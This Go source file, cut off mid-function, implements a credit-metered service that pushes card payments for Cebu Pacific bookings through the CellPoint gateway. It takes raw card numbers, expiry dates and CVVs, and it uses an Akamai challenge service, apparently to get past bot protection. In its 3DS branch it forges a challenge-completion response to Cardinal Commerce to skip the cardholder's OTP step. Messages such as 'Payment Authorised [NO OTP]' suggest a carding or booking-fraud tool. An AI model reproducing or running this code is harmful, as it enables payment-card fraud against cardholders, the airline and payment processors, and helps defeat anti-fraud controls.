package services

import (
	"context"
	"crypto/hmac"
	crand "crypto/rand"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"html"
	"io"
	"math"
	"math/rand"
	"net/http"
	stdjar "net/http/cookiejar"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	http2 "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"

	"cebupac/backend/config"
	"cebupac/backend/database"
	"cebupac/backend/logger"
)

const paymentUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36"

// ProgressTracker is implemented by websocket or event streaming publishers.
type ProgressTracker interface {
	Publish(context.Context, PaymentProgress) error
}

// NoopProgressTracker is used when no realtime progress sink is configured.
type NoopProgressTracker struct{}

// Publish intentionally discards progress events.
func (NoopProgressTracker) Publish(context.Context, PaymentProgress) error { return nil }

// PaymentProgress is emitted during long-running payment execution.
type PaymentProgress struct {
	Stage     string    `json:"stage"`
	Message   string    `json:"message"`
	Percent   int       `json:"percent"`
	Attempt   int       `json:"attempt"`
	Timestamp time.Time `json:"timestamp"`
}

// PaymentRequest contains the inputs required to process a Cebu Pacific payment.
type PaymentRequest struct {
	UserID      string            `json:"userID"`
	XAuthToken  string            `json:"xAuthToken"`
	BearerToken string            `json:"bearerToken"`
	HPPContent  string            `json:"hppContent"`
	CardNumber  string            `json:"cardNumber"`
	Month       string            `json:"month"`
	Year        string            `json:"year"`
	CVV         string            `json:"cvv,omitempty"`
	DeviceID    string            `json:"deviceID,omitempty"`
	IPAddress   string            `json:"ipAddress,omitempty"`
	Amount      int64             `json:"amount,omitempty"`
	CreditsCost int               `json:"creditsCost,omitempty"`
	Metadata    map[string]string `json:"metadata,omitempty"`
}

// Itinerary captures booking data discovered after payment succeeds.
type Itinerary struct {
	RecordLocator string            `json:"recordLocator,omitempty"`
	Details       map[string]string `json:"details,omitempty"`
	Raw           string            `json:"raw,omitempty"`
}

// PaymentResult captures the final outcome of a payment attempt.
type PaymentResult struct {
	Success       bool                 `json:"success"`
	Message       string               `json:"message"`
	Attempts      int                  `json:"attempts"`
	LocCode       string               `json:"locCode,omitempty"`
	LocSubCode    string               `json:"locSubCode,omitempty"`
	FraudStatus   string               `json:"fraudStatus,omitempty"`
	RecordLocator string               `json:"recordLocator,omitempty"`
	Itinerary     *Itinerary           `json:"itinerary,omitempty"`
	Transaction   database.Transaction `json:"transaction"`
}

// PaymentService encapsulates retrying payment execution and persistence side effects.
type PaymentService struct {
	cfg          *config.Config
	logger       *logger.Logger
	akamai       *AkamaiService
	credits      *database.Repository[database.Credit]
	users        *database.Repository[database.User]
	transactions *database.Repository[database.Transaction]
	randomMu     sync.Mutex
	random       *rand.Rand
}

// NewPaymentService constructs a production-ready payment service.
func NewPaymentService(cfg *config.Config, db *database.JSONDatabase, akamai *AkamaiService) (*PaymentService, error) {
	if cfg == nil {
		cfg = config.GetConfig()
	}
	if db == nil {
		var err error
		db, err = database.NewJSONDatabase(cfg)
		if err != nil {
			return nil, err
		}
	}
	credits, err := db.Credits()
	if err != nil {
		return nil, err
	}
	users, err := db.Users()
	if err != nil {
		return nil, err
	}
	transactions, err := db.Transactions()
	if err != nil {
		return nil, err
	}
	if akamai == nil {
		akamai = NewAkamaiService(cfg, nil)
	}
	return &PaymentService{
		cfg:          cfg,
		logger:       logger.GetLogger(),
		akamai:       akamai,
		credits:      credits,
		users:        users,
		transactions: transactions,
		random:       rand.New(rand.NewSource(time.Now().UnixNano())),
	}, nil
}

// ProcessPayment runs the full payment workflow with retry, progress, and persistence.
func (s *PaymentService) ProcessPayment(ctx context.Context, req PaymentRequest, tracker ProgressTracker) (*PaymentResult, error) {
	if tracker == nil {
		tracker = NoopProgressTracker{}
	}
	if err := s.validateRequest(req); err != nil {
		return nil, err
	}
	if err := s.ensureCreditsAvailable(ctx, req.UserID, s.creditCost(req)); err != nil {
		return nil, err
	}

	maxAttempts := s.cfg.Retry.MaxAttempts
	if maxAttempts <= 0 {
		maxAttempts = 3
	}
	var lastResult *PaymentResult
	var lastErr error
	for attempt := 1; attempt <= maxAttempts; attempt++ {
		if err := s.publishProgress(ctx, tracker, "starting", "Starting payment attempt", 5, attempt); err != nil {
			return nil, err
		}
		result, err := s.processAttempt(ctx, req, tracker, attempt)
		if result != nil {
			result.Attempts = attempt
			lastResult = result
		}
		if err == nil && result != nil && result.Success {
			if err := s.deductCredits(ctx, req.UserID, s.creditCost(req)); err != nil {
				return nil, err
			}
			if err := s.persistTransaction(ctx, &result.Transaction); err != nil {
				return nil, err
			}
			_ = s.publishProgress(ctx, tracker, "completed", "Payment completed successfully", 100, attempt)
			return result, nil
		}
		if result != nil && !result.Success {
			lastErr = errors.New(result.Message)
			if err := s.persistTransaction(ctx, &result.Transaction); err != nil {
				return nil, err
			}
			if !s.shouldRetry(result, nil, attempt, maxAttempts) {
				return result, nil
			}
		}
		if err != nil {
			lastErr = err
			if !s.shouldRetry(result, err, attempt, maxAttempts) {
				break
			}
		}
		if attempt < maxAttempts {
			if err := s.publishProgress(ctx, tracker, "retrying", "Retrying payment after transient failure", 10, attempt); err != nil {
				return nil, err
			}
			if err := sleepWithContext(ctx, s.retryDelay(attempt)); err != nil {
				return nil, err
			}
		}
	}
	if lastResult != nil {
		return lastResult, lastErr
	}
	return nil, lastErr
}

func (s *PaymentService) processAttempt(ctx context.Context, req PaymentRequest, tracker ProgressTracker, attempt int) (*PaymentResult, error) {
	if err := s.publishProgress(ctx, tracker, "akamai", "Running Akamai challenge", 20, attempt); err != nil {
		return nil, err
	}
	akamaiClient, err := s.akamai.AcquireClient(ctx)
	if err != nil {
		return s.failureResult(req, "Akamai challenge failed", "", "", ""), fmt.Errorf("acquire Akamai client: %w", err)
	}
	defer s.akamai.ReleaseClient(akamaiClient)

	result, err := s.processManualPayment(ctx, akamaiClient.Client, req, tracker, attempt)
	if err != nil {
		return result, err
	}
	return result, nil
}

func (s *PaymentService) processManualPayment(ctx context.Context, client tls_client.HttpClient, req PaymentRequest, tracker ProgressTracker, attempt int) (*PaymentResult, error) {
	monthInt, _ := strconv.Atoi(req.Month)
	monthFmt := fmt.Sprintf("%02d", monthInt)
	yearShort := req.Year
	if len(req.Year) == 4 {
		yearShort = req.Year[2:]
	}

	if err := s.publishProgress(ctx, tracker, "hpp", "Posting hosted payment page payload", 30, attempt); err != nil {
		return nil, err
	}
	hppStatus, hppHTML, err := s.makeHPPPost(ctx, client, req.XAuthToken, req.BearerToken, req.HPPContent)
	if err != nil {
		return s.failureResult(req, "HPP POST failed", "", "", ""), fmt.Errorf("HPP POST: %w", err)
	}
	switch hppStatus {
	case http.StatusForbidden:
		return s.failureResult(req, "HPP 403 — Akamai blocked", "", "", ""), nil
	case http.StatusNotFound:
		return s.failureResult(req, "HPP 404 — Booking session expired or tokens invalid", "", "", ""), nil
	case http.StatusBadRequest:
		preview := truncate(hppHTML, 500)
		return s.failureResult(req, "HPP 400 — "+preview, "", "", ""), nil
	}
	if hppStatus != http.StatusOK {
		return s.failureResult(req, fmt.Sprintf("HPP error (status %d)", hppStatus), "", "", ""), nil
	}
	if strings.Contains(hppHTML, "Booking balance due must be greater than 0") {
		return s.failureResult(req, "Booking balance due must be greater than 0.", "", "", ""), nil
	}

	postfield := parseHPPForm(hppHTML)
	if postfield == "" {
		return s.failureResult(req, "Failed to parse HPP form. Preview: "+truncate(hppHTML, 500), "", "", ""), nil
	}

	if err := s.publishProgress(ctx, tracker, "web-form", "Submitting gateway form", 40, attempt); err != nil {
		return nil, err
	}
	stdClient := newStdClient()
	webCode, webBody, _, err := doFormPost(ctx, stdClient, "https://pop.cellpointdigital.net/views/web.php", map[string]string{
		"cache-control":             "max-age=0",
		"origin":                    s.cfg.CebupacificAir.BaseURL,
		"referer":                   s.cfg.CebupacificAir.BaseURL + "/",
		"upgrade-insecure-requests": "1",
	}, postfield)
	if err != nil {
		return s.failureResult(req, "web.php failed", "", "", ""), fmt.Errorf("web.php: %w", err)
	}
	if webCode != http.StatusOK {
		return s.failureResult(req, fmt.Sprintf("web.php failed (%d)", webCode), "", "", ""), nil
	}

	v := extractSessionStorage(webBody)
	if len(v) == 0 {
		return s.failureResult(req, "Failed to extract session data from web.php. Preview: "+truncate(webBody, 500), "", "", ""), nil
	}
	amount := req.Amount
	if amount <= 0 {
		amount = parseInt64(v["amount"])
	}

	strOrNull := func(key string) interface{} {
		val := v[key]
		if val == "" {
			return nil
		}
		return val
	}
	operatorInt := func() int {
		if op := v["operator"]; op != "" {
			if n, parseErr := strconv.Atoi(op); parseErr == nil {
				return n
			}
		}
		return 0
	}
	pfParsed, _ := url.ParseQuery(postfield)
	txntype := pfParsed.Get("txntype")

	initMap := map[string]interface{}{
		"country":                  v["country"],
		"mobilecountry":            v["mobilecountry"],
		"clientid":                 v["clientid"],
		"account":                  v["account"],
		"language":                 "en",
		"orderid":                  v["orderid"],
		"mobile":                   v["mobile"],
		"operator":                 operatorInt(),
		"email":                    v["email"],
		"name":                     "Payment User",
		"customerref":              v["customerref"],
		"accounts":                 "",
		"markup":                   "HTML5",
		"amount":                   v["amount"],
		"fees":                     v["fees"],
		"accepturl":                v["accepturl"],
		"cancelurl":                v["cancelurl"],
		"callbackurl":              v["callbackurl"],
		"orderdata":                v["orderdata"],
		"sessionid":                "",
		"currency":                 v["currency-code"],
		"authtoken":                v["authtoken"],
		"deviceid":                 "",
		"hmac":                     v["hmac"],
		"additionaldata":           v["additionaldata"],
		"initToken":                v["inittoken"],
		"iframe":                   false,
		"nonce":                    v["nonce"],
		"txntype":                  txntype,
		"locale":                   "",
		"hppAppVersion":            "2.0.0",
		"logourl":                  "https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077/logo.png",
		"cssurl":                   "https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077",
		"assetsurl":                "https://storage.googleapis.com/bkt-cp-prod-ehpp2/10077",
		"profileid":                v["profileid"],
		"gtmdata":                  strOrNull("gtm-data"),
		"gtmid":                    v["gtm-id"],
		"responsecontenttype":      "1",
		"paymentgroupcode":         strOrNull("paymentgroupcode"),
		"authversion":              strOrNull("authversion"),
		"jsonconvertedrequestdata": v["jsonconvertedrequestdata"],
		"themeversion":             strOrNull("themeversion"),
		"minifyversion":            strOrNull("minifyversion"),
		"timetoken":                v["timetoken"],
		"mitdata":                  strOrNull("mitdata"),
		"producttype":              strOrNull("producttype"),
		"flow":                     strOrNull("flow"),
		"mesbhost":                 "5j.velocity.cellpointmobile.net",
		"surcharge":                strOrNull("surcharge"),
	}
	initBodyBytes, _ := json.Marshal(initMap)
	initBodyStr := string(initBodyBytes)
	initSig, initKey := signBody(initBodyStr)
	tokenHash := v["encryptedAuthHash"]

	var initJSON map[string]interface{}
	for index := 0; index < 30; index++ {
		code, body, _, initErr := doJSONPost(ctx, stdClient, "https://pop.cellpointdigital.net/api/initialize", map[string]string{
			"signature":        initSig,
			"token":            v["inittoken"],
			"key":              initKey,
			"nonce":            v["nonce"],
			"x-encrypted-auth": tokenHash,
			"origin":           "https://pop.cellpointdigital.net",
			"referer":          "https://pop.cellpointdigital.net/",
			"priority":         "u=1, i",
		}, initBodyStr)
		if initErr != nil {
			return s.failureResult(req, "Initialize failed", "", "", ""), fmt.Errorf("initialize: %w", initErr)
		}
		if code == http.StatusOK && len(body) > 0 {
			if err := json.Unmarshal([]byte(body), &initJSON); err != nil {
				return s.failureResult(req, "Initialize response parse failed", "", "", ""), fmt.Errorf("initialize JSON: %w", err)
			}
			break
		}
		if code != http.StatusOK {
			break
		}
	}
	if initJSON == nil {
		return s.failureResult(req, "Initialize was not successful.", "", "", ""), nil
	}

	transactionID := ""
	if tx, ok := initJSON["transaction"].(map[string]interface{}); ok {
		switch id := tx["id"].(type) {
		case float64:
			transactionID = strconv.FormatFloat(id, 'f', 0, 64)
		case string:
			transactionID = id
		}
	}
	initCurrency := "PHP"
	if cur, ok := initJSON["currency"].(string); ok && cur != "" {
		initCurrency = cur
	}

	if err := s.publishProgress(ctx, tracker, "authorize", "Authorizing payment", 55, attempt); err != nil {
		return nil, err
	}
	decktoken := base64.StdEncoding.EncodeToString([]byte(req.CardNumber))
	ctID := cardTypeIDStr(req.CardNumber)
	opForFX := v["operator"]
	if opForFX == "" {
		opForFX = "64000"
	}
	fxMap := map[string]interface{}{
		"country":       v["country"],
		"clientid":      v["clientid"],
		"mobilecountry": v["mobilecountry"],
		"account":       v["account"],
		"orderid":       v["orderid"],
		"mobile":        v["mobile"],
		"operator":      opForFX,
		"email":         v["email"],
		"language":      "en",
		"customerref":   v["customerref"],
		"accounts":      "",
		"markup":        "HTML5",
		"amount":        v["amount"],
		"transaction":   transactionID,
		"currency":      initCurrency,
		"decktoken":     decktoken,
		"cardtypeid":    ctID,
	}
	fxBodyBytes, _ := json.Marshal(fxMap)
	fxCode, fxBodyStr, _, err := doJSONPost(ctx, stdClient, "https://pop.cellpointdigital.net/api/fxlookup", map[string]string{
		"origin":   "https://pop.cellpointdigital.net",
		"referer":  "https://pop.cellpointdigital.net/",
		"priority": "u=1, i",
	}, string(fxBodyBytes))
	if err != nil || fxCode != http.StatusOK {
		return s.failureResult(req, "fxlookup was not successful.", "", "", transactionID), nil
	}
	var fxJSON map[string]interface{}
	_ = json.Unmarshal([]byte(fxBodyStr), &fxJSON)

	var cfxID interface{}
	var fxrate, fxhmac, displayMargin, exchangeAmountStr, saleAmountStr string
	var exchangeCurrNum interface{}
	var saleCurrNum interface{}
	fxStatusCode := "115"
	additionalParams := []map[string]interface{}{}
	if offer, ok := fxJSON["Offer"].(map[string]interface{}); ok {
		cfxID = offer["foreign_exchange_offer_id"]
		if pcoMap, ok := offer["payment_currency_offers"].(map[string]interface{}); ok {
			if pco, ok := pcoMap["payment_currency_offer"].(map[string]interface{}); ok {
				fxrate = fmt.Sprint(pco["offered_exchange_rate"])
				fxhmac = fmt.Sprint(pco["validation_hmac"])
				displayMargin = fmt.Sprint(pco["display_margin_percentage"])
				if displayMargin == "%!v(MISSING)" || displayMargin == "<nil>" {
					displayMargin = "6"
				}
				if ea, ok := pco["exchange_amount"].(map[string]interface{}); ok {
					exchangeAmountStr = fmt.Sprint(ea["price"])
				}
				if sa, ok := pco["sale_amount"].(map[string]interface{}); ok {
					saleAmountStr = fmt.Sprint(sa["price"])
				}
				if ec, ok := pco["exchange_currency"].(map[string]interface{}); ok {
					exchangeCurrNum = ec["iso_numeric_code"]
				}
				if sc, ok := pco["sale_currency"].(map[string]interface{}); ok {
					saleCurrNum = sc["iso_numeric_code"]
				}
			}
		}
	}
	if statusMap, ok := fxJSON["status"].(map[string]interface{}); ok {
		if code, ok := statusMap["code"].(string); ok {
			fxStatusCode = code
		}
	}
	cfxIDStr := fmt.Sprint(cfxID)
	hasFX := cfxID != nil && cfxIDStr != "" && cfxIDStr != "<nil>"
	if hasFX {
		additionalParams = append(additionalParams,
			map[string]interface{}{"name": "margin_percentage", "text": displayMargin},
			map[string]interface{}{"name": "display_margin_percentage", "text": displayMargin},
		)
	} else {
		cfxID = nil
		additionalParams = append(additionalParams, map[string]interface{}{"name": "cfx_status_code", "text": fxStatusCode})
	}
	additionalParams = append(additionalParams,
		map[string]interface{}{"name": "BrowserScreenHeight", "text": 826},
		map[string]interface{}{"name": "BrowserScreenWidth", "text": 563},
		map[string]interface{}{"name": "BrowserLanguage", "text": "en-US"},
		map[string]interface{}{"name": "BrowserJavaEnabled", "text": "false"},
		map[string]interface{}{"name": "BrowserJavascriptEnabled", "text": true},
		map[string]interface{}{"name": "BrowserColorDepth", "text": 24},
		map[string]interface{}{"name": "BrowserTimeZoneOffset", "text": -480},
		map[string]interface{}{"name": "UserAgent", "text": paymentUserAgent},
		map[string]interface{}{"name": "BrowserScreenType", "text": "desktop"},
		map[string]interface{}{"name": "BrowserOrientation", "text": "portrait"},
	)
	decktokenbinrange := base64.StdEncoding.EncodeToString([]byte(req.CardNumber[:minInt(11, len(req.CardNumber))]))
	termination := base64.StdEncoding.EncodeToString([]byte(monthFmt + "/" + yearShort))
	ctIDInt, _ := strconv.Atoi(ctID)
	toInt := func(value string) int {
		n, _ := strconv.Atoi(value)
		return n
	}
	countryInt := toInt(v["country"])
	mobileCountryInt := toInt(v["mobilecountry"])
	authDict := map[string]interface{}{
		"cardname":               "Payment User",
		"decktoken":              decktoken,
		"decktokenbinrange":      decktokenbinrange,
		"termination":            termination,
		"validfrom":              "",
		"cardtypeid":             ctIDInt,
		"paymenttype":            false,
		"token":                  "",
		"network":                "",
		"storecard":              "false",
		"accountconfirmpassword": "",
		"accountpassword":        "",
		"accouontname":           "",
		"typeid":                 "10091",
		"mitdata":                nil,
		"additionaldata":         map[string]interface{}{"param": additionalParams},
		"paymentgroupcode":       nil,
		"country":                countryInt,
		"clientid":               v["clientid"],
		"mobilecountry":          mobileCountryInt,
		"account":                v["account"],
		"mobile":                 v["mobile"],
		"operator":               operatorInt(),
		"email":                  v["email"],
		"language":               "en",
		"customerref":            v["customerref"],
		"markup":                 "HTML5",
		"profileid":              v["profileid"],
		"transaction":            transactionID,
		"refundProtectionNode":   nil,
		"authtoken":              v["authtoken"],
		"billingaddress": map[string]interface{}{
			"fullname":         "Payment User",
			"email":            "",
			"address1":         "123 Rizal Avenue",
			"address2":         "",
			"street":           "123 Rizal Avenue",
			"countryid":        "640",
			"city":             "Manila",
			"state":            "Metro Manila",
			"postalcode":       "1000",
			"mobilecontrycode": 640,
			"mobilenumber":     v["mobile"],
			"cardholderemail":  v["email"],
			"firstName":        "Payment",
			"lastName":         "User",
			"operatorid":       opForFX,
		},
		"cardid":        "",
		"checkouturl":   "",
		"euaid":         "-1",
		"mvault":        "false",
		"verifier":      "",
		"externalCall":  "true",
		"hppAppVersion": "2.0.0",
	}
	if hasFX {
		isoNum := 608
		switch numeric := exchangeCurrNum.(type) {
		case float64:
			isoNum = int(numeric)
		case string:
			isoNum, _ = strconv.Atoi(numeric)
		}
		saleCurrInt := 608
		switch numeric := saleCurrNum.(type) {
		case float64:
			saleCurrInt = int(numeric)
		case string:
			saleCurrInt, _ = strconv.Atoi(numeric)
		}
		authDict["fxservicetypeid"] = "11"
		authDict["amount"] = exchangeAmountStr
		authDict["hmac"] = fxhmac
		authDict["fxrate"] = fxrate
		authDict["currency"] = strconv.Itoa(isoNum)
		authDict["saleamount"] = saleAmountStr
		authDict["salecurrencyid"] = strconv.Itoa(saleCurrInt)
		authDict["cfxid"] = cfxID
	} else {
		authDict["amount"] = v["amount"]
		authDict["hmac"] = v["hmac"]
		authDict["currency"] = toInt(v["currency-code"])
	}
	auth1Bytes, _ := json.Marshal(authDict)
	auth1Str := string(auth1Bytes)
	auth1Sig, auth1Key := signBody(auth1Str)
	auth1Code, _, _, _ := doJSONPost(ctx, stdClient, "https://pop.cellpointdigital.net/api/authorize", map[string]string{
		"signature": auth1Sig,
		"key":       auth1Key,
		"origin":    "https://pop.cellpointdigital.net",
		"referer":   "https://pop.cellpointdigital.net/",
		"priority":  "u=1, i",
	}, auth1Str)
	if auth1Code != http.StatusOK {
		return s.failureResult(req, "Authorize request failed. [Regenerate Postfield.]", "", "", transactionID), nil
	}
	authDict2 := make(map[string]interface{}, len(authDict)+4)
	for key, value := range authDict {
		authDict2[key] = value
	}
	authDict2["deviceId"] = generateUUID()
	authDict2["collectionTime"] = s.random.Intn(9999)
	authDict2["expired"] = "false"
	authDict2["status"] = "true"
	authDict2["message"] = "profile.completed"
	auth2Bytes, _ := json.Marshal(authDict2)
	auth2Str := string(auth2Bytes)
	auth2Sig, auth2Key := signBody(auth2Str)
	_, auth2Body, _, _ := doJSONPost(ctx, stdClient, "https://pop.cellpointdigital.net/api/authorize", map[string]string{
		"signature": auth2Sig,
		"key":       auth2Key,
		"origin":    "https://pop.cellpointdigital.net",
		"referer":   "https://pop.cellpointdigital.net/",
		"priority":  "u=1, i",
	}, auth2Str)
	var authJSON map[string]interface{}
	if err := json.Unmarshal([]byte(auth2Body), &authJSON); err != nil {
		return s.failureResult(req, "Authorize response parse failed", "", "", transactionID), fmt.Errorf("authorize2 JSON: %w", err)
	}
	authorizeCode := fmt.Sprint(authJSON["Code"])
	s.logger.Info("Authorize response received", map[string]string{"code": authorizeCode, "transaction_id": transactionID})

	successFromPaymentComplete := func(pcJSON map[string]interface{}, locCode, locSubCode string) (*PaymentResult, error) {
		fraudDesc := fmt.Sprint(pcJSON["fraud_status_desc"])
		if !isSuccessfulPayment(locCode, locSubCode, fraudDesc) {
			return s.failureResult(req, fmt.Sprintf("Response: %s - %s", locCode, subcodeMessage(locSubCode)), locCode, locSubCode, transactionID), nil
		}
		itinerary, _ := s.retrieveItinerary(ctx, stdClient, v["accepturl"], fmt.Sprint(pcJSON["url"]), pcJSON)
		recordLocator := ""
		if itinerary != nil {
			recordLocator = itinerary.RecordLocator
		}
		amountDisplay := float64(amount) / 100
		message := fmt.Sprintf("Response: Payment Authorised\nFraud Status: %s\nAmount: %.2f\nEmail: %s", fraudDesc, amountDisplay, firstNonEmpty(fmt.Sprint(pcJSON["email"]), v["email"]))
		return &PaymentResult{
			Success:       true,
			Message:       message,
			LocCode:       locCode,
			LocSubCode:    locSubCode,
			FraudStatus:   fraudDesc,
			RecordLocator: recordLocator,
			Itinerary:     itinerary,
			Transaction: database.Transaction{
				ID:            firstNonEmpty(transactionID, newID()),
				UserID:        req.UserID,
				CardLast4:     last4(req.CardNumber),
				Amount:        amount,
				Status:        database.TransactionStatusSucceeded,
				LocCode:       locCode,
				LocSubCode:    locSubCode,
				FraudStatus:   fraudDesc,
				RecordLocator: recordLocator,
				Timestamp:     time.Now().UTC(),
			},
		}, nil
	}

	switch authorizeCode {
	case "2005":
		if err := s.publishProgress(ctx, tracker, "3ds", "Completing 3DS challenge flow", 70, attempt); err != nil {
			return nil, err
		}
		stepupRaw, _ := authJSON["body"].(string)
		decoded := html.UnescapeString(stepupRaw)
		actionRe := regexp.MustCompile(`action='([^']+)'`)
		jwtRe := regexp.MustCompile(`value='(eyJ[^']+)'`)
		actionM := actionRe.FindStringSubmatch(decoded)
		jwtM := jwtRe.FindStringSubmatch(decoded)
		if actionM == nil || jwtM == nil {
			return s.failureResult(req, "Failed to parse 3DS data", "", "", transactionID), nil
		}
		stepupURL := actionM[1]
		stepupJWT := jwtM[1]
		_, cruiseHTML, _, err := doFormPost(ctx, stdClient, stepupURL, map[string]string{
			"origin":                    "https://pop.cellpointdigital.net",
			"referer":                   "https://pop.cellpointdigital.net/",
			"cache-control":             "max-age=0",
			"upgrade-insecure-requests": "1",
			"priority":                  "u=0, i",
		}, "JWT="+url.QueryEscape(stepupJWT))
		if err != nil {
			return s.failureResult(req, "3DS step-up failed", "", "", transactionID), fmt.Errorf("3DS stepup: %w", err)
		}
		payloadRe := regexp.MustCompile(`name="payload" value="([^"]+)"`)
		mcsIDRe := regexp.MustCompile(`name="mcsId" value="([^"]+)"`)
		McsIDRe := regexp.MustCompile(`name="McsId" id="redirect-mcsId" value="([^"]+)"`)
		payloadM := payloadRe.FindStringSubmatch(cruiseHTML)
		mcsIDM := mcsIDRe.FindStringSubmatch(cruiseHTML)
		redirectMcsIDM := McsIDRe.FindStringSubmatch(cruiseHTML)
		if payloadM == nil || mcsIDM == nil {
			return s.failureResult(req, "Failed to parse 3DS cruise data", "", "", transactionID), nil
		}
		jwtPayload := payloadM[1]
		mcsID := mcsIDM[1]
		redirectMcsID := ""
		if redirectMcsIDM != nil {
			redirectMcsID = redirectMcsIDM[1]
		}
		padded := jwtPayload
		if pad := 4 - len(padded)%4; pad != 4 {
			padded += strings.Repeat("=", pad)
		}
		decodedPayloadBytes, decodeErr := base64.StdEncoding.DecodeString(padded)
		if decodeErr != nil {
			decodedPayloadBytes, decodeErr = base64.URLEncoding.DecodeString(padded)
			if decodeErr != nil {
				return s.failureResult(req, "Failed to decode 3DS JWT payload", "", "", transactionID), nil
			}
		}
		var jwtPayloadJSON map[string]interface{}
		if err := json.Unmarshal(decodedPayloadBytes, &jwtPayloadJSON); err != nil {
			return s.failureResult(req, "Failed to parse 3DS JWT payload", "", "", transactionID), err
		}
		cresJSON, _ := json.Marshal(map[string]interface{}{
			"threeDSServerTransID":   jwtPayloadJSON["threeDSServerTransID"],
			"acsTransID":             jwtPayloadJSON["acsTransID"],
			"challengeCompletionInd": "Y",
			"messageType":            "CRes",
			"messageVersion":         "2.2.0",
			"transStatus":            "N",
		})
		cresEncoded := base64.StdEncoding.EncodeToString(cresJSON)
		_, _, _, err = doFormPost(ctx, stdClient, "https://centinelapi.cardinalcommerce.com/V1/TermURL/2.0/CCA", map[string]string{
			"origin":                    "https://authentication.cardinalcommerce.com",
			"referer":                   "https://authentication.cardinalcommerce.com/",
			"cache-control":             "max-age=0",
			"upgrade-insecure-requests": "1",
			"priority":                  "u=0, i",
		}, "cres="+url.QueryEscape(cresEncoded)+"&threeDSSessionData="+url.QueryEscape(mcsID))
		if err != nil {
			return s.failureResult(req, "Cardinal CCA failed", "", "", transactionID), fmt.Errorf("cardinal CCA: %w", err)
		}
		_, redirectHTML, _, err := doFormPost(ctx, stdClient, "https://centinelapi.cardinalcommerce.com/V1/Cruise/TermRedirection", map[string]string{
			"origin":                    "https://centinelapi.cardinalcommerce.com",
			"referer":                   "https://centinelapi.cardinalcommerce.com/V2/Cruise/StepUp",
			"cache-control":             "max-age=0",
			"upgrade-insecure-requests": "1",
			"priority":                  "u=0, i",
		}, "McsId="+url.QueryEscape(redirectMcsID)+"&CardinalJWT=&Error=")
		if err != nil {
			return s.failureResult(req, "Cardinal redirection failed", "", "", transactionID), fmt.Errorf("cardinal TermRedirection: %w", err)
		}
		txIDRe := regexp.MustCompile(`name="TransactionId" value="([^"]+)"`)
		txIDM := txIDRe.FindStringSubmatch(redirectHTML)
		if txIDM == nil {
			return s.failureResult(req, "Merchant's response was not captured. [Retry running the script again.]", "", "", transactionID), nil
		}
		noRedirectClient := newNoRedirectClient()
		cyberReq, _ := http.NewRequestWithContext(ctx, http.MethodPost, "https://5j.velocity.cellpointmobile.net/mpi/cybersource/threed-redirect", strings.NewReader("TransactionId="+url.QueryEscape(txIDM[1])+"&Response=&MD=null"))
		cyberReq.Header.Set("content-type", "application/x-www-form-urlencoded")
		cyberReq.Header.Set("user-agent", paymentUserAgent)
		cyberReq.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		cyberReq.Header.Set("accept-language", "en-US,en;q=0.9")
		cyberReq.Header.Set("origin", "https://centinelapi.cardinalcommerce.com")
		cyberReq.Header.Set("referer", "https://centinelapi.cardinalcommerce.com/")
		cyberReq.Header.Set("cache-control", "max-age=0")
		cyberReq.Header.Set("upgrade-insecure-requests", "1")
		cyberReq.Header.Set("priority", "u=0, i")
		cyberResp, err := noRedirectClient.Do(cyberReq)
		if err != nil {
			return s.failureResult(req, "Cybersource redirect failed", "", "", transactionID), fmt.Errorf("cybersource redirect: %w", err)
		}
		_, _ = io.ReadAll(cyberResp.Body)
		cyberResp.Body.Close()
		location := cyberResp.Header.Get("Location")
		if location == "" {
			return s.failureResult(req, "Merchant's response was not captured. [Retry running the script again.]", "", "", transactionID), nil
		}
		parsedLoc, _ := url.Parse(location)
		qp := parsedLoc.Query()
		locCode := qp.Get("code")
		locSubCode := qp.Get("sub_code")
		if locCode != "2000" || locSubCode != "2000101" {
			return s.failureResult(req, fmt.Sprintf("Response: %s - %s", locCode, subcodeMessage(locSubCode)), locCode, locSubCode, transactionID), nil
		}
		var securedData map[string]interface{}
		if sd, ok := initJSON["secured_data"].(map[string]interface{}); ok {
			securedData = sd
		}
		pcDict := map[string]interface{}{
			"transactionId":      transactionID,
			"clientId":           "10077",
			"pollingTimeout":     "30",
			"minPollingInterval": "1",
			"maxPollingInterval": "10",
			"secure":             "false",
			"token":              v["timetoken"],
			"sessiontime":        "13",
		}
		for key, value := range securedData {
			pcDict[key] = value
		}
		pcBytes, _ := json.Marshal(pcDict)
		_, pcBody, _, _ := doJSONPost(ctx, stdClient, "https://pop.cellpointdigital.net/api/paymentcomplete", map[string]string{
			"referer": location,
			"origin":  "https://pop.cellpointdigital.net",
		}, string(pcBytes))
		var pcJSON map[string]interface{}
		if err := json.Unmarshal([]byte(pcBody), &pcJSON); err != nil {
			return s.failureResult(req, "paymentcomplete response parse failed", locCode, locSubCode, transactionID), fmt.Errorf("paymentcomplete JSON: %w", err)
		}
		if fraudDesc := fmt.Sprint(pcJSON["fraud_status_desc"]); fraudDesc == "Rejected" {
			return s.failureResult(req, "Response: Payment Authorized but Fraud Status was Rejected", locCode, locSubCode, transactionID), nil
		}
		s.completeSession(ctx, stdClient, location, pcJSON, securedData, transactionID, v)
		return successFromPaymentComplete(pcJSON, locCode, locSubCode)
	case "2000":
		itinerary, _ := s.retrieveItinerary(ctx, stdClient, v["accepturl"], "", authJSON)
		recordLocator := ""
		if itinerary != nil {
			recordLocator = itinerary.RecordLocator
		}
		amountDisplay := float64(amount) / 100
		return &PaymentResult{
			Success:       true,
			Message:       fmt.Sprintf("Response: Payment Authorised [NO OTP]\nAmount: %.2f\nEmail: %s", amountDisplay, v["email"]),
			LocCode:       "2000",
			LocSubCode:    "2000101",
			FraudStatus:   "Approved",
			RecordLocator: recordLocator,
			Itinerary:     itinerary,
			Transaction: database.Transaction{
				ID:            firstNonEmpty(transactionID, newID()),
				UserID:        req.UserID,
				CardLast4:     last4(req.CardNumber),
				Amount:        amount,
				Status:        database.TransactionStatusSucceeded,
				LocCode:       "2000",
				LocSubCode:    "2000101",
				FraudStatus:   "Approved",
